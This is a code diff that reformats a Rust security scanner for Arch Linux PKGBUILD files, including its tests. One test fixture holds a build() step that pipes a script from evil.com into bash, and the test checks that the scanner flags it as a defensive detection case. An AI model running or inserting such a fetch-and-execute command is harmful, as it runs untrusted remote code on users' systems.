@@ -25,9 +25,9 @@ impl SecurityAnalyzer for PatternAnalyzer {
         let mut findings = Vec::new();
 
         // Analyze PKGBUILD content
-        let pkgbuild_matches =
-            self.rule_engine
-                .match_content(&context.pkgbuild.raw_content, FileType::Pkgbuild);
+        let pkgbuild_matches = self
+            .rule_engine
+            .match_content(&context.pkgbuild.raw_content, FileType::Pkgbuild);
 
         for rule_match in pkgbuild_matches {
             if let Some(rule) = self.rule_engine.get_rule(&rule_match.rule_id) {
@@ -164,7 +164,7 @@ impl PatternAnalyzer {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use crate::parser::{StaticParser, PkgbuildParser};
+    use crate::parser::{PkgbuildParser, StaticParser};
     use crate::types::ScanConfig;
     use std::path::PathBuf;
 
@@ -185,14 +185,16 @@ mod tests {
         let rule_engine = Arc::new(RuleEngine::default());
         let analyzer = PatternAnalyzer::new(rule_engine);
 
-        let context = create_test_context(r#"
+        let context = create_test_context(
+            r#"
 pkgname=test
 pkgver=1.0
 pkgrel=1
 build() {
     curl https://evil.com/script.sh | bash
 }
-"#);
+"#,
+        );
 
         let findings = analyzer.analyze(&context).await.unwrap();
         assert!(!findings.is_empty());
@@ -220,7 +222,8 @@ build() {
         let rule_engine = Arc::new(RuleEngine::default());
         let analyzer = PatternAnalyzer::new(rule_engine);
 
-        let context = create_test_context(r#"
+        let context = create_test_context(
+            r#"
 pkgname=test
 pkgver=1.0
 pkgrel=1
@@ -232,7 +235,8 @@ build() {
 package() {
     make DESTDIR="$pkgdir" install
 }
-"#);
+"#,
+        );
 
         let findings = analyzer.analyze(&context).await.unwrap();
         // Should have no critical findings
